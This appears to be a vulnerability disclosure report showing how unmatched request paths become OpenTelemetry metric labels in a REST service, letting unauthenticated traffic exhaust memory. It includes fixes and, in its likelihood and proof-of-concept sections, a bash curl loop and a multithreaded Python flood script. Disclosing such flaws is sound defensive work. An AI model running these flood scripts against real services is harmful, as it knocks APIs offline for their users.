### Title
Unbounded OpenTelemetry Label Cardinality via Unmatched Route Path Injection Leading to OOM

### Summary
The `metricsMiddleware` in `rest/middleware/metricsHandler.js` records per-route metrics using a `path` label derived from `toOpenApiPath()`. For requests that do not match any Express route, `toOpenApiPath()` falls back to the raw `req.path` value with no normalization or cardinality cap. An unprivileged attacker can flood the server with requests to unique, never-before-seen paths, causing the OpenTelemetry SDK to allocate a new in-memory aggregation entry per unique `{method, path, code}` label set across four instruments, growing process heap without bound until OOM.

### Finding Description

**Exact code path:**

`rest/middleware/metricsHandler.js`, `toOpenApiPath()` (lines 13–31):
```js
if (!path) {
  if (!req.route) {
    path = req.path;   // ← raw attacker-controlled path, no normalization
  } else {
    path = (req.baseUrl ?? '') + req.route?.path;
  }
}
``` [1](#0-0) 

When a request does not match any registered Express route, `req.route` is `undefined`, so `path` is set to the literal `req.path` string — fully attacker-controlled.

**Label construction and recording** (lines 192, 207–210):
```js
const labels = {method, path, code};
requestTotalCounter.add(1, labels);
durationHistogram.record(duration, labels);
requestSizeHistogram.record(..., labels);
responseSizeHistogram.record(responseSize, labels);
``` [2](#0-1) 

Each unique `{method, path, code}` triple causes the OpenTelemetry JS SDK (`@opentelemetry/sdk-metrics`) to allocate a new `MetricData` aggregation record for each of the four instruments. The SDK has **no default cardinality limit** on the number of unique attribute sets it will track.

**No rate limiting exists in the application stack.** `server.js` registers no rate-limit middleware before `metricsHandler()`: [3](#0-2) 

The `authHandler` only acts on requests that supply credentials; unauthenticated requests pass through silently: [4](#0-3) 

**Root cause:** The failed assumption is that `toOpenApiPath()` will always return a low-cardinality, parameterized path. This holds for matched routes (`:id` → `{id}`), but completely breaks for unmatched routes where the raw path is used verbatim.

### Impact Explanation
An attacker can exhaust the Node.js process heap by continuously injecting new unique path strings as metric label values. Each unique path creates four new in-memory aggregation objects (one per instrument). At scale (millions of unique paths), this causes the REST API process to crash with an out-of-memory error, resulting in a complete denial of service for all API consumers. Because the OTel SDK accumulates these records across the entire process lifetime (until a scrape/reset cycle), the memory is not reclaimed between requests.

### Likelihood Explanation
The attack requires zero authentication, zero special knowledge, and zero protocol-level access beyond the ability to send HTTP GET requests to the public REST API port. It is trivially scriptable:
```bash
for i in $(seq 1 1000000); do
  curl -s "http://target/api/v1/nonexistent/$RANDOM$RANDOM$RANDOM" &
done
```
Any internet-accessible deployment is vulnerable. The attack is repeatable and can be sustained indefinitely.

### Recommendation
1. **Normalize unmatched-route paths**: In `toOpenApiPath()`, replace the `path = req.path` fallback with a fixed sentinel string such as `"unknown"` or `"unmatched"` to prevent raw user input from becoming a label value.
2. **Cap label cardinality**: Configure the OpenTelemetry SDK with a `CardinalityLimit` view (available in `@opentelemetry/sdk-metrics` ≥ 1.9) to hard-cap the number of unique attribute sets per instrument.
3. **Add rate limiting**: Deploy a rate-limiting middleware (e.g., `express-rate-limit`) before `metricsHandler()` in `server.js` to limit the rate at which unique paths can be injected.

### Proof of Concept
**Preconditions:** `config.metrics.enabled = true` (default), no external rate limiter, Node.js process running `rest/server.js`.

**Steps:**
1. Start the mirror-node REST service.
2. Run the following script against the service:
```python
import requests, threading, random, string

def flood():
    while True:
        path = ''.join(random.choices(string.ascii_lowercase, k=20))
        try:
            requests.get(f"http://target-host/api/v1/{path}", timeout=2)
        except:
            pass

threads = [threading.Thread(target=flood) for _ in range(100)]
for t in threads: t.start()
for t in threads: t.join()
```
3. Monitor the Node.js process RSS memory (`process.memoryUsage().rss`) via the `/swagger/metrics/` endpoint — observe `nodejs_process_memory_heap_used_bytes` growing without bound.
4. The process will eventually crash with `FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory`.

**Why existing checks fail:** The `authHandler` does not block unauthenticated requests — it only sets a user limit for authenticated ones. No rate limiting exists in the middleware chain. The OTel SDK has no cardinality cap configured.
